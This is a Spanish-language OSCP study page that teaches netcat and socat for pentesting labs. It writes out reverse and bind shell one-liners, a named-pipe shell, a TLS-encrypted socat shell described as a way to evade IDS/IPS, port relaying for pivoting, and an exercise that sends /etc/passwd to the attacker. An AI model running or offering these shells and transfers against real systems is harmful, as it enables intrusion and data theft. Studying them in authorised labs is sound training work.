---
title: "netcat y socat"
order: 14
description: La navaja suiza TCP/IP y su evolución — cómo usar nc y socat para shells, transferencias y reenvío de puertos en un pentest real.
---

## ¿Por qué nc y socat en OSCP?

Antes de que existieran frameworks como Metasploit, los pentesters usaban `nc` y `socat` para mover datos, recibir shells y pivotar. El OSCP valora que entiendas estas herramientas porque:

1. **Están en casi cualquier sistema** — nc viene instalado en Linux, macOS y Windows (con ncat de Nmap).
2. **No levantan alertas de AV** de la misma forma que un payload compilado.
3. **Entienderás qué hace Metasploit por dentro** cuando abra un handler.

```text
  Atacante (Kali)          Red / Firewall          Víctima
  ┌─────────────┐         ┌──────────┐         ┌──────────────┐
  │  nc -lvnp   │◄────────│ TCP:443  │◄────────│  nc / socat  │
  │     443     │  shell  └──────────┘  conn   └──────────────┘
  └─────────────┘
```

---

## netcat (nc / ncat)

### Flags imprescindibles

| Flag | Significado |
|------|-------------|
| `-l` | Modo escucha (listener) |
| `-v` | Verbose: muestra conexión establecida |
| `-n` | No resuelve DNS (más rápido, menos ruido) |
| `-p <puerto>` | Puerto en modo listen |
| `-e <cmd>` | Ejecuta un programa al conectar (no en todas las versiones) |
| `-u` | UDP en lugar de TCP |

> [!NOTE]
> La versión de `nc` en Debian/Ubuntu es **netcat-openbsd** y **no tiene `-e`**. La versión **netcat-traditional** y **ncat** (de Nmap) sí la incluyen. En el OSCP encontrarás ambas en víctimas.

### Banner grabbing y conexión manual

El caso más básico: conectar a un puerto TCP como si fueras un cliente.

```bash
nc -nv 10.10.10.5 22
nc -nv 10.10.10.5 80
```

Útil para leer el banner de SSH/FTP/SMTP o enviar peticiones HTTP a mano:

```text
GET / HTTP/1.0
Host: 10.10.10.5

```

(dos saltos de línea para terminar la petición HTTP/1.0)

### Listener para recibir una reverse shell

```bash
# En tu Kali — espera a que la víctima se conecte
nc -lvnp 443
```

El puerto 443 suele estar permitido en firewalls salientes (tráfico HTTPS de salida). Ver por qué en [Firewalls, NAT y Tunneling](/cybersec/manual/redes/firewalls-nat-y-tunneling).

> [!WARNING]
> Los comandos siguientes abren shells remotas. Úsalos EXCLUSIVAMENTE en laboratorios autorizados (HTB, THM, tu propio entorno).

### Reverse shell desde la víctima

**Con `-e` (versiones que la soportan):**

```bash
nc -nv <IP_atacante> 443 -e /bin/bash
```

**Sin `-e` — named pipe (funciona en cualquier versión de nc):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_atacante> 443 >/tmp/f
```

Cómo funciona el named pipe:
```text
/tmp/f (FIFO)
   ↑ escritura desde nc         ↓ lectura por cat
cat /tmp/f  →  /bin/bash -i  →  salida  →  nc  →  Kali
                    ↑__________________________________________↓
```

La FIFO cierra el bucle: la salida de bash vuelve a nc que la envía a Kali, y lo que Kali escribe llega a bash a través de la FIFO.

### Bind shell

En lugar de que la víctima se conecte a ti, ella escucha y tú te conectas:

```bash
# En la víctima
nc -lvnp 4444 -e /bin/bash

# En tu Kali
nc -nv <IP_víctima> 4444
```

> [!IMPORTANT]
> La bind shell **falla cuando hay firewall de entrada** en la víctima (lo habitual). La reverse shell es preferible porque el tráfico SALIENTE rara vez se filtra. Explicación completa en [Firewalls, NAT y Tunneling](/cybersec/manual/redes/firewalls-nat-y-tunneling).

### Transferencia de ficheros

```bash
# Receptor (Kali) — espera el fichero
nc -lvnp 4444 > fichero_recibido.zip

# Emisor (víctima) — envía el fichero
nc -nv <IP_Kali> 4444 < /ruta/al/fichero.zip
```

nc no tiene barra de progreso. Para verificar integridad, compara el MD5 en ambos extremos después.

---

## socat: nc con superpoderes

`socat` (SOcket CAT) conecta **dos canales bidireccionales** entre sí. Su sintaxis es:

```bash
socat <canal_A> <canal_B>
```

Donde un canal puede ser `TCP-LISTEN`, `TCP`, `EXEC`, `FILE`, `OPENSSL`, etc.

### Reverse shell con TTY completa

Esta es la **mayor ventaja de socat sobre nc**: la shell recibida tiene TTY real, por lo que funcionan `vim`, `sudo`, `Ctrl+C`, completado con Tab, etc.

```bash
# En Kali (atacante) — listener con TTY
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En la víctima
socat tcp:<IP_atacante>:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

¿Por qué funciona? `pty` asigna un pseudo-terminal en la víctima; `sane` pone la terminal en modo sano; `setsid` crea una nueva sesión de proceso; `sigint` reenvía Ctrl+C. En el lado del atacante, `raw,echo=0` desactiva el procesamiento local para que los caracteres vayan directos al pty remoto.

> [!TIP]
> Si no tienes socat en la víctima, sube el binario estático desde tu Kali con nc o wget. Puedes descargar binarios precompilados del repo [static-binaries](https://github.com/andrew-d/static-binaries).

### Port forwarding / relay

`socat` puede actuar como proxy TCP: escucha en un puerto y reenvía todo al destino.

```bash
# En el pívot (máquina intermedia):
# Todo lo que llegue al 8080 se reenvía al 80 de 10.10.10.5
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80
```

La opción `fork` es clave: crea un proceso hijo por cada conexión, permitiendo múltiples clientes simultáneos. Sin `fork`, socat termina tras la primera conexión.

Esto es equivalente al reenvío de puertos que puedes hacer con SSH. Para técnicas más avanzadas de pivoting ve a [Firewalls, NAT y Tunneling](/cybersec/manual/redes/firewalls-nat-y-tunneling).

### Cifrado con OPENSSL

Para evadir IDS/IPS que inspeccionan el contenido del tráfico, socat puede cifrar el canal:

```bash
# Generar certificado autofirmado en Kali
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener cifrado en Kali
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 file:`tty`,raw,echo=0

# En la víctima
socat OPENSSL:<IP_atacante>:4444,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

`verify=0` desactiva la validación del certificado (el equivalente a `curl -k`). El tráfico queda cifrado con TLS, lo que hace que un IDS no pueda ver los comandos ni la salida.

---

## Reverse vs Bind shell: el porqué

```text
REVERSE SHELL (preferida):
  Víctima ──inicia conexión saliente──► Kali
  Los firewalls suelen PERMITIR tráfico saliente.

BIND SHELL:
  Kali ──intenta conectar entrante──► Víctima (escuchando)
  Los firewalls de entrada BLOQUEAN esto habitualmente.
```

La reverse shell aprovecha que casi ninguna organización filtra el tráfico saliente de sus servidores. Es el modelo que usarás el 90% del tiempo en OSCP.

---

## Práctica

**Ejercicio 1.** Monta un listener en Kali y lanza la reverse shell correspondiente desde una máquina víctima (puedes usar otra terminal o una VM). Comprueba que recibes la shell y ejecuta `id` y `hostname`.

<details>
<summary>Ver solución</summary>

**En Kali (terminal 1):**

```bash
nc -lvnp 443
```

**En la víctima (terminal 2 / otra máquina):**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP_Kali> 443 >/tmp/f
```

Una vez conectado, verás el prompt de bash. Ejecuta:

```bash
id
hostname
```

Para salir, `exit` o `Ctrl+C` en Kali.

</details>

**Ejercicio 2.** Transfiere un fichero desde la "víctima" a tu Kali usando nc. Después verifica la integridad con `md5sum`.

<details>
<summary>Ver solución</summary>

**En Kali (receptor):**

```bash
nc -lvnp 4444 > fichero_recibido.txt
```

**En la víctima (emisor):**

```bash
nc -nv <IP_Kali> 4444 < /etc/passwd
```

**Verificar integridad en ambos lados:**

```bash
# En la víctima
md5sum /etc/passwd

# En Kali
md5sum fichero_recibido.txt
```

Los hashes deben coincidir.

</details>

---

## Recursos

- [ncat(1) — manpage Ubuntu](https://manpages.ubuntu.com/manpages/noble/man1/ncat.1.html)
- [socat(1) — manpage Ubuntu](https://manpages.ubuntu.com/manpages/noble/man1/socat.1.html)
- [HackTricks — Shells (Linux, Windows, MSFVenom)](https://book.hacktricks.wiki/generic-methodologies-and-resources/shells/)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [static-binaries (andrew-d)](https://github.com/andrew-d/static-binaries)
